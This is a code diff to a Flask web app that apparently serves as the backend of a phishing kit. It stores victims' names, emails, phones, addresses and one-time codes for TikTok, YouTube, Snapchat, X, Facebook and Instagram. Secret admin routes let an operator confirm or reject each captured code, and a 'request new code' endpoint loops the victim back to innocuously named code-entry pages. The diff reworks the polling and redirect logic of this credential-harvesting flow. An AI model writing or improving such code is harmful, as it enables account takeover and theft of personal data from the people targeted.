@@ -76,20 +76,6 @@ def save_submission(page, user, data, code_value=None, platform_name=None):
         ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0))
         conn.commit()
 
-def check_confirmation(code_value):
-    with sqlite3.connect(DB_FILE) as conn:
-        result = conn.execute(
-            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-            (code_value,)
-        ).fetchone()
-        if result:
-            return {
-                'confirmed': bool(result[0]),
-                'rejected': bool(result[1]),
-                'resend_requested': bool(result[2])
-            }
-        return {'confirmed': False, 'rejected': False, 'resend_requested': False}
-
 def extract_user(form):
     for key in ("address","email","phone","fullname","street","username"):
         val = form.get(key)
@@ -549,10 +535,21 @@ def m1():
 
 # ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========
 
-@app.route('/api/check_confirmation/<code_value>')
-def api_check_confirmation(code_value):
-    status = check_confirmation(code_value)
-    return jsonify(status)
+@app.route('/api/check_confirmation/<int:submission_id>')  # Changed to submission_id
+def api_check_confirmation(submission_id):
+    with sqlite3.connect(DB_FILE) as conn:
+        result = conn.execute(
+            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE id = ?',
+            (submission_id,)
+        ).fetchone()
+        if result:
+            return jsonify({
+                'status': 'approved' if result[0] else 'rejected' if result[1] else 'pending',
+                'confirmed': bool(result[0]),
+                'rejected': bool(result[1]),
+                'resend_requested': bool(result[2])
+            })
+        return jsonify({'status': 'not_found', 'confirmed': False, 'rejected': False, 'resend_requested': False})
 
 @app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
 def admin_confirm(submission_id):
@@ -561,7 +558,6 @@ def admin_confirm(submission_id):
         conn.commit()
     return jsonify({'success': True})
 
-# NEW: Reject submission endpoint
 @app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
 def admin_reject(submission_id):
     with sqlite3.connect(DB_FILE) as conn:
@@ -569,39 +565,55 @@ def admin_reject(submission_id):
         conn.commit()
     return jsonify({'success': True})
 
-# NEW: Request new code endpoint
+# NEW: Improved request new code endpoint with proper redirection
 @app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
 def api_request_new_code(submission_id):
     with sqlite3.connect(DB_FILE) as conn:
-        # Mark that user requested a new code
-        conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
-        
-        # Get platform info for redirect
+        # Get the current submission details to determine where to redirect
         submission = conn.execute(
-            'SELECT platform_name FROM submissions WHERE id = ?', (submission_id,)
+            'SELECT page, platform_name FROM submissions WHERE id = ?', (submission_id,)
         ).fetchone()
         
-        conn.commit()
-    
-    if submission:
-        platform = submission[0] or 'Unknown'
-        # Determine which page to redirect back to based on platform
-        redirect_url = get_previous_code_page(platform)
-        return jsonify({'success': True, 'redirect_url': redirect_url})
+        if submission:
+            current_page = submission[0]
+            platform = submission[1] or 'Unknown'
+            
+            # Mark that user requested a new code
+            conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
+            conn.commit()
+            
+            # Determine which page to redirect back to based on CURRENT page
+            redirect_url = get_current_previous_page(current_page, platform)
+            return jsonify({'success': True, 'redirect_url': redirect_url})
     
     return jsonify({'success': False, 'error': 'Submission not found'})
 
-def get_previous_code_page(platform):
-    """Determine which page to send user back to based on platform"""
-    platform_pages = {
-        'TikTok': '/joy1_2',
-        'YouTube': '/joy2_2', 
-        'Snapchat': '/happy1_2',
-        'X / Twitter': '/happy2_2',
-        'Facebook': '/love1_2',
-        'Instagram': '/love2_2'
+def get_current_previous_page(current_page, platform):
+    """Determine which page to send user back to based on CURRENT page"""
+    page_redirects = {
+        # TikTok pages
+        'joy1_2': '/joy1_2',
+        'joy1_3': '/joy1_3',
+        # YouTube pages  
+        'joy2_2': '/joy2_2',
+        'joy2_3': '/joy2_3',
+        # Snapchat pages
+        'happy1_2': '/happy1_2',
+        'happy1_3': '/happy1_3',
+        # Twitter pages
+        'happy2_2': '/happy2_2', 
+        'happy2_3': '/happy2_3',
+        # Facebook pages
+        'love1_2': '/love1_2',
+        'love1_3': '/love1_3',
+        # Instagram pages
+        'love2_2': '/love2_2',
+        'love2_3': '/love2_3',
+        # Common flow pages
+        'f1_A': '/f1_A',
+        'f2_A': '/f2_A'
     }
-    return platform_pages.get(platform, '/')
+    return page_redirects.get(current_page, '/')
 
 # UPDATED: Admin route with statistics calculation
 @app.route(f"/admin/{ADMIN_SECRET}")
